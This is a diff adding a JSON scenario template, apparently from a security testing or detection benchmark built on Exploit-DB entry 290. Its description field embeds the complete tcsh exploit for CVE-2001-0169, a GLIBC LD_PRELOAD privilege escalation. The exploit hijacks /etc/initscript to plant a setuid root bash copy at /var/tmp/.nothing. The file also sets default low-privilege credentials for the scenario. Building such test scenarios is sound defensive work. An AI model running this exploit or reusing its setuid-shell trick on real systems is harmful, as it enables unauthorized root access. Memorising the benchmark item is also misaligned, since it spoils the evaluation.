@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_290",
+  "category": "B1_ld_preload",
+  "attack_technique": "T1574.006",
+  "cwe": "CWE-427",
+  "description": "Linux privilege escalation: GLIBC 2.1.3 - 'LD_PRELOAD' Local Privilege Escalation (OSVDB-1731;CVE-2001-0169)\n\nExploit source code (290.tcsh):\n```\n#!/bin/tcsh\n# przyklad wykorzystania dziury w LD_PRELOAD\n# shadow (tested on redhat 6.0, should work on others)\n\nif ( -e /etc/initscript ) echo uwaga: /etc/initscript istnieje\ncd /lib\numask 0\nsetenv LD_PRELOAD libSegFault.so\nsetenv SEGFAULT_OUTPUT_NAME /etc/initscript\necho czekaj... to moze chwile potrwac...\nwhile (! -e /etc/initscript )\n  ( userhelper >& /dev/null & ; killall -11 userhelper >& /dev/null ) > /dev/null\nend\n\necho utworzylem plik initscript\n\ncat > /etc/initscript << _init_\ncp /bin/bash /var/tmp/.nothing\nchmod 6755 /var/tmp/.nothing\nrm /etc/initscript\n_init_\n\necho i nawet go podmienilem\n\n# milw0rm.com [2001-03-04]\n```",
+  "cve": "OSVDB-1731;CVE-2001-0169",
+  "exploitdb_id": "290",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_290",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
